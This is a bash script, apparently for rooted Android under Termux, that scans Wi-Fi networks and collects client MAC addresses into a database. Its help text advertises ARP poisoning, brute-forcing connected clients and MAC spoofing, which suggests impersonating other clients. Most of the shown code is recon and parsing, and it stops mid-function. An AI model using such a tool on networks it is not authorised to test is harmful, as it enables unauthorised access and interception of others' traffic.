#!/bin/bash



							trap "echo terminated by user; _trap_cleanup; exit 1" SIGINT SIGTERM
						_process_usage()
										{
											local msg1 msg2 msg3 msg4 msg5
											msg1="Usage: wifi-spotter [options]\n"
											msg1+=" Experience network testing in advanced manner.\n\n"
											msg1+="Parameters:\n"
											msg1+="   -i, [ <interface> ]\n   -c, [ <connect mode> ]\n   -s, [ <scan mode> ]\n   -m, [ <monitor mode> ]\n"
											msg1+="   -p, [ <parse mode> ]\n   -h, [ <show help> ]\n   -g, [ <merge db> ]\n   -v, [ <version info> ]\n"
											msg1+="Examples:\n   wifi-spotter xx:xx:xx:xx:xx:xx\n   wifi-spotter -p somefile.pcap\n   wifi-spotter -s1\n   wifi-spotter -h scan\n   wifi-spotter -h all"

											msg2="Available Network scan options:\n"
											msg2+="   1, Scan with default route (recommended)\n"
											msg2+="   2, Scan with arping (slow scan)\n"
											msg2+="   3, Scan with ping6 (for IPv6 networks)\n"
											msg2+="   4, Scan MikroTik's address (experimental)\n"
											msg2+="     Example: wifi-spotter -s1"

											msg3="Available Network mointor options:\n"
											msg3+="   1, Mointor clients traffic & do nothing else\n"
											msg3+="   2, Mointor clients traffic & poison arp reqs\n"
											msg3+="   3, Mointor IPv6 replies\n"
											msg3+="   4, Mointor network discovery replies\n"
											msg3+="     Example: wifi-spotter -m1"

											msg4="Available Wi-Fi connect options:\n"
											msg4+="   a, Auto (Auto network discovery)\n"
											msg4+="   f, Fast (Fast network discovery)\n"
											msg4+="   c, Connect (Connect to selected network)\n"
											msg4+="   s, Survival (Survive network connection)\n"
											msg4+="   n, Count (Count available clients requests)\n"
											msg4+="   x, Target (Bruteforce connected clients)\n"
											msg4+="   t, Test (Perform eligibility test)\n"
											msg4+="   r, Reset (Remove all saved networks)\n"
											msg4+="     Example: wifi-spotter -ct"

											msg5="Available quick options:\n"
											msg5+="   r, reconnect (Reconnect into current network).\n"
											msg5+="   m, random (Set random address and reconnect).\n"
											msg5+="   xx:xx:xx:xx:xx:xx (Set passed address and reconnect).\n"
											msg5+="     Example: wifi-spotter CA:01:23:45:67:89"


												_echo "$msg1" 1
											if [[ "$1" = "a"* ]]; then
												_echo "\n$msg2\n\n$msg3\n\n$msg4\n\n${msg5}" 1
											elif [[ "$1" = "s"* ]]; then
												_echo "\n$msg2" 1
											elif [[ "$1" = "m"* ]]; then
												_echo "\n$msg3" 1
											elif [[ "$1" = "c"* ]]; then
												_echo "\n$msg4" 1
											fi
												return 1
										}
						_process_config()
										{
														_trap_cleanup()
																{
																	local x y
																	{ 
																		if [ "$mode" = "parse" ]; then
																			return 1
																		elif [ "$mode" = "connect" ]; then
																			_json_initconfig || return 1; _json_networkclients "xclients"; _json_networkclients "tclients"; _json_networkclients "admins"
																		elif [ "$mode" = "scan" ]; then
																			_json_initconfig || return 1; _json_networkclients "clients"
																		elif [ "$mode" = "mointor" ]; then
																			_json_initconfig || return 1; _json_networkclients "clients"; _json_networkndp
																		else
																			_echo "_trap_cleanup: error unknown mode is set: ${mode}" 0
																		fi
																			hum_date=$(date "+date: %d-%m-%Y time: %H:%M:%S"); log+="WIFI-Spotter has ended (${hum_date}).\n\n\n"; echo -e "$log" >>"${log_file}"
																	} &
																	kill -9 "$(ps -ef | awk '{print $2" "$9}' | grep -E "${home_dir}/plugins/reporter.sh|${home_dir}/plugins/updater.sh" | awk '{print $1}' | tr '\n' ' ')" 2>/dev/null
																	{ x=$(cat "${home_dir}/logs/reporter.pid" 2>/dev/null); kill -9 "${x}" 2>/dev/null; }
																	nohup ${home_dir}/plugins/reporter.sh &>/dev/null &
																	echo "${!}">"${home_dir}/logs/reporter.pid"; disown
																}
														_json_initconfig()
																{
																		local tmp c
																	if [ ! -w "${home_dir}" ]; then
																		_echo "\t\t_json_initconfig --> error cannot write into: ${home_dir}" 0
																		return 1
																	fi
																	if [ ! -s "${db_file}" ]; then
																		_echo "\t\t_json_initconfig --> warnning creating new db file: ${db_file}" 0
																		echo "${db_struct}" | jq . >"${db_file}"
																	fi
																	if [ ! -w "${db_file}" ]; then
																		_echo "\tError cannot write into: ${db_file}" 1
																		_echo "\t\t_json_initconfig --> error cannot write into: ${db_file}" 0
																		return 1
																	fi
																		c=$(jq '.ws | keys' "${db_file}" 2>&1 | tr '\n' '#')
																	if [[ "${c}" =~ '"bssid"' ]] && [[ "${c}" =~ '"gid"' ]]; then
																		return 0
																	else
																		tmp="${home_dir}/logs/${db_filename}_${bot_date}.log"
																		_echo "\t\t_json_initconfig --> error db file is corrupted: [result](${c}) [db](${tmp})" 0
																		mv "${db_file}" "${tmp}"
																		echo "${db_struct}" | jq . >"${db_file}"
																		return 0
																	fi
																}
														_json_networkinfo()
																{
																			local b s f g r d v u tmp
																		if [ -z "${iwbssid[1]}" ]; then
																			return 1
																		fi
																			tmp=$(mktemp)
																		if ! (jq --arg b "${iwbssid[1]}" \
																				--arg s "${iwssid[1]}" \
																				--arg f "${iwfreq[1]}" \
																				--arg g "${gateway}" \
																				--arg r "${route}" \
																				--arg d "${domain}" \
																				--arg v "${host}:${port}" \
																				--arg u "${bot_date}" \
																				'.ws.bssid.[$b]+={
																				"ssid":$s,"freq":$f,"gwip":$g,"route":$r,"domain":$d,"server":$v,
																				"stamp":$u}' "$db_file" >"${tmp}" && mv "${tmp}" "${db_file}"); then
																			_echo "\t\t_json_networkinfo --> error could not save info: [iwbssid](${iwbssid[1]}) [iwssid](${iwssid[1]}) [iwfreq](${iwfreq[1]}) [gwip](${gateway}) [route](${route}) [domain](${domain}) [server](${host}:${port})" 0
																		fi
																}
														_json_networkclients()
																{
																		_validate_address()
																						{
																								local i m c; i=0
																								result=(0 0)
																							for m in ${@,,}; do
																									c="${m//[0-9]/}"; c="${c//[a-f]/}"
																								if [ ${#c} -ne 5 ]; then
																									continue
																								fi
																									c="${m//:/}"
																								if [ ${#c} -ne 12 ]; then
																									continue
																								fi
																									i=$((i+1))
																								if [ ${i} -ne 1 ]; then
																									result[0]+=" ${m}"
																								else
																									result[0]=" ${m}"
																								fi
																							done
																									result[1]="${i}"
																								if [ ${result[1]} -eq 0 ]; then
																									return 1
																								fi
																						}
																		_organize_clients()
																						{
																								local i x list
																								_validate_address "${@}" || { _echo "\t\t_json_networkclients --> error clients list is empty: [${sub}](${@}) [result[0]](${result[0]})" 0; return 1; }
																							for x in ${result[0]}; do
																									i=$((i+1))
																								if [ ${i} -eq 1 ]; then
																									list="[\"${x}\""
																									[ ${i} -eq ${result[1]} ] && list+="]"
																								elif [ ${i} -eq ${result[1]} ]; then
																									list+=",\"${x}\"]"
																								else
																									list+=",\"${x}\""
																								fi
																							done
																									unset result
																									result="${list}"
																						}
																			local e b arr tmp sub
																		if ([ ${#clients} -ne 0 ] || \
																			[ ${#tclients} -ne 0 ] || \
																			[ ${#xclients} -ne 0 ] || \
																			[ ${#admins} -ne 0 ]); then
																			true
																		else
																			return 0
																		fi
																			_validate_address "${iwbssid[1]}" || { _echo "\t\t_json_networkclients --> error iwbssid is invalid: [iwbssid](${iwbssid[1]})" 0; return 1; }

																		if [ "${1}" = "admins" ]; then
																			sub="admins"
																			_organize_clients "${admins}" || return 1
																		elif [ "${1}" = "tclients" ]; then
																			sub="tclients"
																			_organize_clients "${tclients}" || return 1
																		elif [ "${1}" = "xclients" ]; then
																			sub="xclients"
																			tbssid+=",\"${iwbssid[1]}\""
																			[ "${tbssid: -1}" = "," ] && tbssid="${tbssid:0: -1}"
																			[ "${tbssid:0:1}" = "," ] && tbssid="${tbssid:1}"
																			_organize_clients "${xclients}" || return 1
																		else
																			sub="clients"
																			_organize_clients "${clients}" || return 1
																		fi

																			tmp=$(mktemp); e=0
																		if [ "${sub}" = "xclients" ]; then
																			if ! (jq --arg b "${iwbssid[1]}" \
																				--argjson arr "${result}" \
																				'.ws.bssid.[$b]."xclients" |= (. + $arr | unique) | .ws.bssid.['${tbssid}']."clients" |= (. - $arr | unique)' "$db_file" >"${tmp}" && mv "${tmp}" "${db_file}"); then
																				e=1
																			fi
																		else
																			if ! (jq --arg b "${iwbssid[1]}" \
																				--argjson arr "${result}" \
																				'.ws.bssid.[$b].'${sub}' |= (. + $arr | unique)' "$db_file" >"${tmp}" && mv "${tmp}" "${db_file}"); then
																				e=1
																			fi
																		fi
																		if [ ${e} -ne 0 ]; then
																			_echo "\t\t_json_networkclients --> error could not save info: [iwbssid](${iwbssid[1]}) [${sub}](${result})" 0
																		fi
																}
														_json_networkgid()
																{
																			local g b s t tmp arr
																		if [ -z "$gid" ] || [ "${gid[0]}" = "0" ] || [ "${gid[1]}" = "0" ]; then
																			return 1
																		elif [ -z "${iwbssid[1]}" ]; then
																			return 1
																		fi
																			tmp=$(mktemp)
																		if ! (jq --arg g "${gid}" \
																				--arg b "$(echo -n "${gid[1]}" | base64)" \
																				--arg s "$(getprop persist.sys.timezone)" \
																				--arg t "${bot_date}" \
																				'.ws.gid.[$g] +={"blob":$b,"state":$s,"stamp":$t}' "$db_file" >"${tmp}" && mv "${tmp}" "${db_file}"); then
																			_echo "\t\t_json_networkgid --> error could not save info: [gid](${gid})" 0
																		fi
																			tmp=$(mktemp)
																		if ! (jq --arg g "${gid}" \
																				--argjson arr "[\"${iwbssid[1]}\"]" \
																				'.ws.gid.[$g].list |= (. + $arr | unique)' "$db_file" >"${tmp}" && mv "${tmp}" "${db_file}"); then
																			_echo "\t\t_json_networkgid --> error could not save info: [iwbssid](${iwbssid[1]})" 0
																		fi
																}
														_json_networkndp()
																{
																			local b arr tmp
																		if [ -z "${list_ndp_db}" ]; then
																			return 1
																		elif [ -z "${iwbssid[1]}" ]; then
																			return 1
																		fi
																			tmp=$(mktemp)
																		if ! (jq --arg b "${iwbssid[1]}" \
																				--argjson arr "[${list_ndp_db:0:-1}]" \
																				'.ws.bssid.[$b].ndp |= (. + $arr | unique)' "$db_file" >"${tmp}" && mv "${tmp}" "${db_file}"); then
																			_echo "\t\t_json_networkndp --> error could not save info: [iwbssid](${iwbssid[1]}) [list_ndp_db](${list_ndp_db})" 0
																		fi
																}
														_json_networkinfoauto()
																{
																			local tmp new
																		if [ -z "${list_wifi_json}" ]; then
																			return 1
																		fi
																			new=$(mktemp)
																			tmp=$(mktemp)
																		if ! (echo "{\"ws\":{\"bssid\":{${list_wifi_json}}}}" | jq . >"$new" && \
																				jq -n 'reduce inputs as $item ({}; . *= $item)' "$db_file" "$new" >"${tmp}" && mv "${tmp}" "${db_file}"); then
																			_echo "\t\t_json_networkinfoauto --> error could not save info: (${list_wifi_json})" 0
																		fi
																}
														_validate_storage()
																{
																	if [ ! -d "${home_dir}" ]; then
																		mkdir -p "${home_dir}"
																	fi
																	if [ -w "${home_dir}" ]; then
																		_json_initconfig || return 1
																	else
																		_echo "Error cannot write into: ${home_dir}" 1; return 1
																	fi

																	if [ ! -d "${home_dir}/logs" ]; then
																		mkdir -p "${home_dir}/logs"
																	fi
																	if [ -w "${home_dir}/logs" ]; then
																		echo -n>"${home_dir}/logs/tmp"
																		echo -n>"${home_dir}/logs/err"
																	else
																		_echo "Error cannot write into: ${home_dir}/logs" 1; return 1
																	fi
																}
														_source_plugin()
																{
																	if [ ! -s "${1}" ]; then
																		_echo "\tError can not find plugin: ${1}" 1
																		return 1
																	elif [ ! -x "${1}" ]; then
																		_echo "\tError can not execute plugin: ${1}" 1
																		return 1
																	else
																		source "${1}" && return 0 || return 1
																	fi
																}
												local db_struct db_file db_filename home_dir log_file hum_date bot_date option help scan_option monitor_option args connect_option version commit confirm_update
												db_struct='{"ws":{"bssid":{},"gid":{}}}'
												home_dir=~/wifi-spotter-root
												db_filename="wsdb_44"
												db_file="${home_dir}/${db_filename}.json"
												log_file="${home_dir}/logs/ws.log"
												full_date=($(date "+%s %d%m%y date: %d-%m-%Y time: %H:%M:%S"))
												hum_date="${full_date[@]:2}"
												bot_date="${full_date[0]}"
												obf_date="${full_date[1]}"
												commit="unknown"
												version="unknown"
												useragent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.32 Safari/537.36"

												args="${@}"
											while getopts i:c:s:m:p:h:gv option; do
												case "$option" in
													i) iface="${OPTARG}";;
													c) [ -z "$mode" ] && { mode="connect"; connect_option="${OPTARG:0:1}"; } || { mode="many"; break; };;
													s) [ -z "$mode" ] && { mode="scan"; scan_option="${OPTARG:0:1}"; } || { mode="many"; break; };;
													m) [ -z "$mode" ] && { mode="mointor"; mointor_option="${OPTARG:0:1}"; } || { mode="many"; break; };;
													p) [ -z "$mode" ] && { mode="parse"; input_file="${OPTARG}"; } || { mode="many"; break; };;
													h) mode="usage"; help="${OPTARG}"; break;;
													g) ${home_dir}/plugins/database-merger.sh --merge; return 0;;
													v) echo "wifi-spotter-${version}-${commit}"; return 0;;
													?) mode="usage"; break;;
												esac
											done

												# updater
											if [ -s "${home_dir}/updates/update.tar.gz" ]; then
													echo -e "${color_success}New version available !${color_reset}"
													echo -ne "${color_warn}Do you want to update now (y/n)?${color_reset}"
													read confirm_update
												if ([ -z "${confirm_update}" ] || [[ "${confirm_update}" =~ (Y|y) ]]); then
													export ws_update="yes"
													${home_dir}/plugins/updater.sh --silent-update
													return 0
												fi
											fi

												# environment check
												source "${home_dir}/.wsprofile"

												# database rollback
											if [ "${wsdb_scheme}" != "44" ]; then
												# starting from v4.3-b1 db renamed from wsdb into wsdb_43
												# db must be cleared once since it's may contain invalide data inserted by old versions.
												# yet again with v4.4-b1 db renamed again to fix issues caused by previous versions.
												mv "${home_dir}/wsdb.json" "${home_dir}/logs/wsdb_$(date +%s).log"
												mv "${home_dir}/wsdb_43.json" "${home_dir}/logs/wsdb_$(date +%s).log"
												for x in ${PREFIX}/tmp/*; do
													cp "${x}" "${home_dir}/logs/wsdb_$(date +%s).log"
												done
												"${home_dir}/plugins/database-merger.sh" --restore || { echo "Error: restore db failed !"; rm -f "${home_dir}/wsdb_44.json"; exit 1; }
												"${home_dir}/plugins/database-merger.sh" --clear || { echo "Error: clear db failed !"; rm -f "${home_dir}/wsdb_44.json"; exit 1; }
												echo "wsdb_scheme=\"44\"" >>"${home_dir}/.wsprofile"
											fi

											if [ "$(id -u)" = "0" ]; then
												_echo "- Error not allowed to run with root\nTip: Try again without sudo" 1
												return 1
											elif [ -n "$TERMUX_VERSION" ]; then
												prefix="/data/data/com.termux/files/usr/bin"
											else
												_echo "- Error unsupported platform" 1
												return 1
											fi

												log="WIFI-Spotter has started (version: ${version}-${commit} ${hum_date}):\n_process_config --> home_dir: ${home_dir}\n"
												_echo "_process_config --> parameters: (${args})" 0

												_validate_storage || return 1
											if [ -p /dev/stdin ]; then
												mode="parse"
											elif [ "$mode" = "many" ]; then
												_echo "Not allowed to use more than one mode at same time.\nTip: Use only -s, -m switch or -p switch." 1; return 1
											elif [[ "$mode" =~ (scan|mointor|connect) ]]; then
												[ -z "${iface}" ] && iface="wlan0"
											elif [ -n "${input_file}" ]; then
												mode="parse"
												[ -s "${input_file}" ] || { _echo "Error cannot read: ${input_file}" 1; return 1; }
											elif [ "${#1}" = "17" ] || [ "${#1}" = "18" ]; then
												_process_connect "quick_setaddr" "${1}"
												return ${?}
											elif [ "${1}" = "reconnect" ] || [ "${1}" = "r" ]; then
												_process_connect "reconnect"
												return ${?}
											elif [ "${1}" = "random" ] || [ "${1}" = "m" ]; then
												_process_connect "quick_setaddr" "--random"
												return ${?}
											else
												_process_usage "${help}"; return 1
											fi

												_echo "_process_config --> mode: ${mode}" 0
											if [ "$mode" = "parse" ]; then
												_process_parse
											elif [ "$mode" = "connect" ]; then
												[[ ! "$connect_option" =~ (a|f|c|s|n|x|t|r) ]] && { _echo "$connect_option is invalid connect option\nTip: Use -h connect to list available connect options." 1; return 1; }
												#_process_networkinfo || return 1
												_process_connect "${connect_option}"
											elif [ "$mode" = "scan" ]; then
												[[ ! "$scan_option" =~ (1|2|3|4) ]] && { _echo "$scan_option is invalid scan option\nTip: Use -h scan to list available scan options." 1; return 1; }
												_process_networkinfo || return 1
												_process_scan "$scan_option"
											elif [ "$mode" = "mointor" ]; then
												[[ ! "$mointor_option" =~ (1|2|3|4) ]] && { _echo "$mointor_option is invalid mointor option\nTip: Use -h mointor to list available mointor options." 1; return 1; }
												_process_networkinfo || return 1
												_process_tcpdump "$mointor_option"
											fi

												# trap cleanup
												_trap_cleanup
										}
						_process_parse()
										{
												local p
												p=0
												stdin="${home_dir}/logs/tmp"
												_echo "_process_parse --> writting file into: ${stdin}" 0
												[ -p /dev/stdin ] && cat >"${stdin}" || cat "$input_file" >"${stdin}"

											while read -r x; do
												[[ "$x" =~ (Interface: ) ]] && { p=1; break; }
												[[ "$x" =~ (default dev |default via ) ]] && { p=2; break; }
												[[ "$x" =~ (phy|Interface |Connected to ) ]] && { p=3; break; }
												[[ "$x" =~ ($'\324ò\241\002\004\004') ]] && { p=4; break; }
												[[ "$x" =~ (html>) ]] && { p=5; break; }
												break
											done< <(sed -n 1p "${stdin}")
												if [ $p -eq 0 ]; then
													_echo "\t\t_process_parse --> error could not identify header: ${x}" 0; return 1
												elif [ $p -eq 1 ]; then
													{ stdin="cat $stdin"; _parse_arpscan; return 1; }
												elif [ $p -eq 2 ]; then
													{ stdin="cat $stdin"; _parse_iproute; return 1; }
												elif [ $p -eq 3 ]; then
													{ stdin="cat $stdin"; _parse_iw; return 1; }
												elif [ $p -eq 4 ]; then
													{ stdin="$stdin"; _process_tcpdump; return 1; }
												elif [ $p -eq 5 ]; then
													{ stdin="$stdin"; _parse_html; return 1; }
												fi
													return 1
										}
						_process_networkinfo()
										{
													local arr x u
										x="$home_dir/logs/tmp"
									_echo "- Getting network information..." 1
											su -c ''${prefix}'/ip route show table all dev '${iface}' >'${x}' 2>&1'
												{ stdin="cat $x"; _parse_iproute; }
														[ "$route" = "0" ] && { _echo "\tCannot read route: ${route}" 1; return 1; }

											su -c ''${prefix}'/iw dev '${iface}' link >'${x}' 2>&1; '${prefix}'/iw dev '${iface}' info >>'${x}' 2>&1'
												{ stdin="cat $x"; _parse_iw; }
														[ "${iwfreq[1]}" = "0" ] && { _echo "\tCannot read freq: ${iwfreq[1]}" 1; return 1; }

												{ stdin="$x"; _process_serveraddress; err=${?}; }
														[ ${err} -ne 0 ] && { _echo "\tError ${err}: reading info failed !" 1; return 1; }

											_echo "- Network Information:\n\tSSID: ${iwssid[1]}\n\tBSSID: ${iwbssid[1]}\n\tFrequency: ${iwfreq[1]}\n\tGID: ${gid:0:12}\n\tYour IP-Address: $devip\n\tYour MAC-Address: ${addr[2]}\n\tGateway: $gateway\n\tRoute: $route\n\tServer-Domain: $domain\n\tServer-Address: ${host}:${port}" 1
												_json_initconfig && _json_networkinfo && _json_networkgid
												return 0
										}
						_process_scan()
										{
												local p x
												_echo "- Startting arp-scan:" 1
											if [ $1 = 1 ]; then
												[ "$route" != "0" ] && p="${route}" || p="--localnet"
											elif [ $1 = 2 ]; then
												_process_arping; return 1
											elif [ $1 = 3 ]; then
												_process_ping6 "scan"; return ${?}
											elif [ $1 = 4 ]; then
												[ "${host}" != 0 ] && p="${host:0:-1}0/16" || { _echo "\tCannot read host: 0" 1; return 1; }
											else
												return 1
											fi
												_echo "_process_scan --> arp-scan parameters: ${p}" 0
											x="$home_dir/logs/tmp"
												_echo "_process_scan --> reading from file: ${x}" 0
												su -c ''${prefix}'/arp-scan -I '${iface}' '$p' --format='\''${ip} ${mac} ${vendor}'\'' >'${x}' 2>&1'
													# -g contains issues
													stdin="cat $x"
														_parse_arpscan
															return $?
										}
							_process_serveraddress()
										{
											local err
											_source_plugin "${home_dir}/plugins/302-parser.sh" || return 1
											_302parser_parse_auto "http://google.com" "${home_dir}/logs/tmp" "${AUTO_SCAN_TIMEOUT}" &>>"${log_file}"; err=${?}
											[ ${err} -eq 2 ] && { gid=0; port=0; host=0; domain=0; return 0; }
											([ ${err} -eq 4 ] || [ ${err} -eq 0 ]) && return 0 || return ${err}
										}










							_count_and_notify()
										{
												local i; i="${1}"
												play-audio "$home_dir/sfx/notification_done.m4a" &
											if [ ${i} -le 2 ]; then
												{ sleep 1; play-audio "$home_dir/sfx/notification_condition0.m4a"; } &
												return 0
											elif [ ${i} -le 20 ]; then
												{ sleep 1; play-audio "$home_dir/sfx/notification_condition1.m4a"; } &
												return 2
											elif [ ${i} -gt 20 ]; then
												{ sleep 1; play-audio "$home_dir/sfx/notification_condition2.m4a"; } &
												return 3
											else
												play-audio "$home_dir/sfx/notification_error.m4a" &
												return 1
											fi
										}
							_parse_arpscan()
										{
												local i x list arr vendor
												i=(0 0)
												_echo "- Parsing from arp-scan:" 2
											while read x; do
												[[ "$x" =~ (Operation not permitted|You don\'t have permission|ERROR: Could not obtain MAC|ioctl failed: Permission denied) ]] && { _echo "Failed to start arp-scan\nTip: Try again with sudo" 1; return 1; }
												[[ "$x" =~ (Interface:|Starting|packets|Ending|WARNING|which may not|Either configure|with the|No such device exists|ERROR: failed to send packet) ]] && continue
												[ -n "$x" ] && { arr=($x); i[0]=$((i[0]+1)); } || continue
												[[ "$list" != *"${arr[1]}"* ]] && { list+="${arr[1]} "; i[1]=$((i[1]+1)); } || { _echo "\t\t_parse_arpscan --> skipping previous device: ${arr[1]}" 0; continue; }
												vendor="${arr[2]/(/}"; vendor="${vendor/)/}"; vendor="${vendor/:/}"
												_echo "\t${arr[0]} ${arr[1]} (${vendor})" 1
											done< <($stdin)
												_echo "\tScan completed found: ${i[1]} devices" 1
												_echo "\t\t_parse_arpscan --> scan completed: total(${i[0]}) filtered(${i[1]})" 0
												unset clients; clients="${list}"
												_count_and_notify "${i[1]}"; return ${?}
										}
							_parse_iproute()
										{
												local x i
												gateway=0; route=0; devip=0; i=0
												_echo "- Parsing from iproute:" 2
											while read x; do
												[[ "$x" =~ (default via ) ]] && [ $i -eq 0 ] && arr=($x) && gateway="${arr[2]}" && i=$((i+1))
												[[ ! "$x" =~ (table) ]] && [ $i -eq 1 ] && arr=($x) && route="${arr[0]}" && devip="${arr[6]}" && i=$((i+1))
												[[ "${x}" =~ (broadcast ) ]] && [ $i -eq 1 ] && arr=($x) && devip="${arr[9]}" && _generate_default_route "${devip}" && route="${result[0]}" && gateway="${result[1]}" && i=$((i+1))
											done< <($stdin)
											if [ $i -eq 2 ]; then
												_echo "\t\t_parse_iproute --> returned result: [devip](${devip}) [gateway](${gateway}) [route](${route})" 0
												_echo "\tYour-IP: ${devip}\n\tGateway: ${gateway}\n\tRoute: ${route}" 2; return 0
											elif [ $i -eq 0 ]; then
												_echo "\t\t_parse_iproute --> error cannot read from iproute: ${i}" 0; return 1
											else
												_echo "\t\t_parse_iproute --> unexpected error while parsing from iproute: $i" 0; return 1
											fi
										}
							_parse_iw()
										{
												local i x arr
												iwface=(0); addr=(0); iwssid=(0); iwbssid=(0); iwfreq=(0); i=0
												_echo "- Parsing from iw:" 2
											while read -r x; do
												[[ "$x" =~ (Usage:|command failed:) ]] && break
												[[ "$x" =~ (phy|ifindex|wdev|type managed) ]] && continue
												[[ "$x" =~ (SSID: \\x1e) ]] && continue
												[[ "$x" =~ (Interface ) ]] && i=$((i+1)) && arr=($x) && iwface[$i]="${arr[1]}" && continue
												[[ "$x" =~ (addr ) ]] && arr=($x) && addr[$i]="${arr[1]}" && continue
												[[ "$x" =~ (ssid ) ]] && iwssid[$i]="$(echo -e "$x" | sed "s/ssid //")" && continue
												[[ "$x" =~ (Connected to ) ]] && i=$((i+1)) && arr=($x) && iwbssid[$i]="${arr[2]}" && iwface[$i]="${arr[4]}" && iwface[$i]="${iwface[$i]/)/}" && continue
												[[ "$x" =~ (SSID: ) ]] && iwssid[$i]="$(echo -e "$x" | sed "s/SSID: //")" && continue
												[[ "$x" =~ (freq: ) ]] && arr=($x) && iwfreq[$i]="${arr[1]}" && continue
											done< <($stdin)
											until [ $i -eq 0 ]; do
												if [ -n "${iwfreq[$i]}" ]; then
													_echo "\tInterface: ${iwface[$i]}\n\tSSID: ${iwssid[$i]}\n\tBSSID: ${iwbssid[$i]}\n\tFrequency: ${iwfreq[$i]}" 2
													_echo "\t\t_parse_iw --> returned result: [iwface](${iwface[$i]}) [iwssid](${iwssid[1]}) [iwbssid](${iwbssid[1]}) [iwfreq](${iwfreq[1]}) [devmac](${addr[2]})" 0
												elif [ -n "${iwssid[$i]}" ]; then
													_echo "\tInterface: ${iwface[$i]}\n\tSSID: ${iwssid[$i]}\n\tAddress: ${addr[$i]}" 2
													_echo "\t\t_parse_iw --> returned result: [iwface](${iwface[$i]}) [iwssid](${iwssid[1]}) [devmac](${addr[2]})" 0
												elif [ -n "${addr[$i]}" ]; then
													_echo "\tInterface: ${iwface[$i]}\n\tAddress: ${addr[$i]}" 2
													_echo "\t\t_parse_iw --> returned result: [iwface](${iwface[$i]}) [devmac](${addr[i]})" 0
												else
													_echo "\t\tUnexpected error while reading: $i" 2
												fi
													i=$((i-1))
											done
										}
							_parse_html()
										{
											cat "${stdin}" | jq . 2>/dev/null && return 0
											_source_plugin "${home_dir}/plugins/302-parser.sh" || return 1
											cat "${stdin}" | _302parser_parse_strings | _302parser_filter_strings
											return 0
										}
							_convert_ipv6_into_mac()
										{
												# ipv62mac implemention: https://stackoverflow.com/a/37316533
												local x y z u result
												ipv62mac=0
											for x in ${@}; do
													y="${x}"; y="${y/\/*/}"; y="${y//:/ }"
												for z in ${y:4}; do
													while [ "${#z}" -lt 4 ]; do z="0${z}"; done
													u+=" ${z:0: -2}"
													u+=" ${z:2}"
												done
													arr=(${u}); arr[0]=$(printf "%02x" $((0x${arr[0]} ^ 2)))
													unset arr[3]; unset arr[4]; result="${arr[@]}"; result="${result// /:}"
													ipv62mac="${result}"
											done
										}
							_convert_mac_into_ipv6()
										{
												# mac2ipv6 implemention: https://stackoverflow.com/a/37316533
												local x y z result
												mac2ipv6=0
											for x in ${@}; do
													x="${x//:/ }"; arr=(${x})
													arr[2]+=" ff"; arr[2]+=" fe"
													arr[0]=$(printf "%x" $((0x${arr[0]} ^ 2)))
												for y in ${arr[@]}; do
													[ -z "${z}" ] && { z="${y}"; continue; }
													result+="${z}${y}:"; unset z
												done
													result="${result:0: -1}"
													result="fe80::${result}/64"
													mac2ipv6="${result}"
											done
										}
							_generate_default_route()
										{
												# Ref: http://www.rjsmith.com/CIDR-Table.html
												local i r x g; i=0; r=0
												g="${1}"; result=(0 0)
											for x in ${g//./ }; do
												if [ ${i} -eq 0 ]; then
													result[0]="${x}"
												elif [ ${i} -eq 1 ] && [ ${x} -eq 0 ]; then
													result[0]+=".0"; r=$((r+1))
												elif [ ${i} -eq 1 ] && [ ${x} -ne 0 ]; then
													result[0]+=".${x}"
												elif [ ${i} -eq 2 ] && [ ${x} -eq 0 ]; then
													result[0]+=".0"; r=$((r+1))
												elif [ ${i} -eq 2 ] && [ ${x} -ne 0 ]; then
													result[0]+=".${x}"
												fi
													i=$((i+1))
											done
													result[1]="${result[0]}.1"
												if [ ${r} -eq 2 ]; then
													result[0]+=".0/8"
												elif [ ${r} -eq 1 ]; then
													result[0]+=".0/16"
												else
													result[0]+=".0/24"
												fi
										}


									_echo()
										{
												# 0 = show only on verbose mode
												# 1 = show anytime
												# 2 = show only on parse mode
											if [ "$2" = "1" ]; then
												echo -e "$1"
											elif [ "$2" = "0" ]; then
													log+="${1}\n"
												if [ "$verbose" = "yes" ]; then
													echo -e "$1"
												fi
											elif [ "$2" = "2" ]; then
												if [ "$mode" = "parse" ]; then
													echo -e "$1"
												fi
											else
												echo "_echo --> error unknown mode: $2 with message: $1"
											fi
										}
									_error_msg()
										{
											echo -e "\t${color_error}${1}${color_reset}"
											[ -n "${2}" ] && echo -e "\t${color_tip}${2}${color_reset}"
											play-audio "$home_dir/sfx/notification_error.m4a" &
										}

						_process_connect()
										{
												_wificonnect_status()
																{
																		local mode u x w tmp err y
																		mode="$1"; u=0
																		u="'$(su -c ''${prefix}'/cmd wifi status 2>&1 | tr -d "\n"')'"

																	if [ "${mode}" = "is_disabled" ] && [[ "${u}" =~ "Wifi is disabled" ]]; then
																		_echo "- Exiting... Wi-Fi is disabled by user" 1
																		exit 1 # return 1
																	elif [ "${mode}" = "is_enabled" ] && [[ "${u}" =~ "Wifi is disabled" ]]; then
																		_echo "- Enabling Wi-Fi" 1
																			# svc = Legacy Android
																			# cmd = Modern Android
																		su -c ''${prefix}'/cmd wifi set-wifi-enabled enabled >/dev/null 2>&1' || su -c 'svc wifi enable'
																		sleep 1.0
																		return 0
																	elif [ "${mode}" = "get_wifi_info" ]; then
																		_connection_interface_getinfo "${iface}" "${prefix}" &>>"${log_file}"; err=${?}
																		[ ${err} -eq 0 ] && return 0 || { _echo "\t${color_error}Failed to get info: ${err}${color_reset}" 1; return ${err}; }
																	elif [ "${mode}" = "reconnect" ]; then
																		_connection_interface_reconnect "${ws_disconnect_alt}" "${iface}" "${prefix}" &>>"${log_file}"; err=${?}
																		[ ${err} -eq 0 ] && return 0 || { _echo "\t${color_error}Failed to reconnect: ${err}${color_reset}" 1; return ${err}; }
																	elif [ "${mode}" = "is_disconnected" ] && [[ "${u}" =~ "Wifi is connected to" ]]; then
																		_connection_interface_disconnect "${ws_disconnect_alt}" "${iface}" "${prefix}" &>>"${log_file}"; err=${?}
																		[ ${err} -eq 0 ] && return 0 || { _echo "\t${color_error}Failed to disconnect: ${err}${color_reset}" 1; return ${err}; }
																	fi
																}
											_wificonnect_getinfo()
																{
																		_begin_wifiscan()
																						{
																							local x
																							x="${home_dir}/logs/tmp"
																							su -c ''${prefix}'/timeout -k10 10 '${prefix}'/iw '${1}' scan 2>&1' >"${x}"
																							echo -e "$(cat "${x}" | sed -e 's#(on wlan# (on wlan#g' | awk '
																							BEGIN {
																							  printf("[\n")
																							}
																							NF > 0 {
																							  if ($1 == "BSS") {
